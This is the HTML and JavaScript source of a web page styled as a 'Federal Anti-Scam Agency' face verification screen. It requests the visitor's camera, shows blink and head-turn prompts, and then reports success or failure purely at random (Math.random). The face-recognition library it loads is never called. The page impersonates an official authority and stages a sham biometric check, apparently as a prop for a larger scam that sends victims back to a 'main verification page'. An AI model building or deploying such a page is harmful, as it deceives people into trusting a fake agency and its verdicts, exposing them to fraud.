<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Federal Anti-Scam Agency - Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>

<style>
* { margin:0; padding:0; box-sizing:border-box; font-family: 'Inter', sans-serif; }

body {
  background: #0b1f3a;
  color: #fff;
}

/* HEADER */
.header {
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:15px 20px;
  background:#0a1a33;
}

.header img {
  width:45px;
}

.header h1 {
  font-size:16px;
  color:#00c2ff;
}

/* SCREEN */
.screen {
  display:none;
  padding:20px;
  text-align:center;
}

.active {
  display:block;
}

/* BUTTON */
.btn {
  margin-top:30px;
  padding:15px;
  width:100%;
  border:none;
  border-radius:30px;
  background:linear-gradient(90deg,#00ffcc,#00bfa6);
  color:#fff;
  font-size:18px;
  font-weight:600;
}

/* CAMERA */
video {
  width:100%;
  max-width:300px;
  border-radius:50%;
  border:5px solid #00ffcc;
  margin-top:20px;
}

/* RESULT */
.success { background:#0ea34a; }
.fail { background:#c62828; }

.card {
  background:#0d274d;
  padding:20px;
  border-radius:12px;
  margin-top:20px;
}

.notice {
  background:#f5e6c5;
  color:#000;
  padding:15px;
  border-radius:10px;
  margin-top:20px;
}

</style>
</head>

<body>

<div class="header">
  <h1>FEDERAL ANTI-SCAM AGENCY</h1>
</div>

<!-- HOME -->
<div id="home" class="screen active">
  <h2>Face Verification</h2>
  <p>Please follow the instructions to complete verification.</p>

  <div class="card">
    <p>✔ Stay in bright environment</p>
    <p>✔ Face inside frame</p>
    <p>✔ Remove glasses/masks</p>
  </div>

  <button class="btn" onclick="start()">Start Verification</button>
</div>

<!-- CAMERA -->
<div id="camera" class="screen">
  <h2 id="instruction">Align your face</h2>
  <video id="video" autoplay muted></video>
  <button class="btn" onclick="beginScan()">Verify</button>
</div>

<!-- LOADING -->
<div id="loading" class="screen">
  <h2>Verifying Your Face...</h2>
</div>

<!-- RESULT -->
<div id="result" class="screen">
  <h2 id="statusText"></h2>
</div>

<!-- FINAL -->
<div id="final" class="screen">
  <div class="notice">
    <b>Important Notice:</b><br>
    Please return to main verification page to continue.
  </div>
</div>

<script>
let video = document.getElementById("video");

async function start(){
  switchScreen("camera");
  const stream = await navigator.mediaDevices.getUserMedia({ video:true });
  video.srcObject = stream;
}

function beginScan(){
  let steps = ["Blink your eyes", "Turn head left", "Turn head right"];
  let i = 0;

  let interval = setInterval(()=>{
    document.getElementById("instruction").innerText = steps[i];
    i++;
    if(i >= steps.length){
      clearInterval(interval);
      verify();
    }
  },3000);
}

function verify(){
  switchScreen("loading");

  setTimeout(()=>{
    let success = Math.random() > 0.3;

    switchScreen("result");

    if(success){
      document.body.className = "success";
      document.getElementById("statusText").innerText = "Successfully Verified";
    } else {
      document.body.className = "fail";
      document.getElementById("statusText").innerText = "Verification Failed";
    }

    setTimeout(()=>{
      switchScreen("final");
    },5000);

  },3000);
}

function switchScreen(id){
  document.querySelectorAll(".screen").forEach(s=>s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}
</script>

</body>
</html>
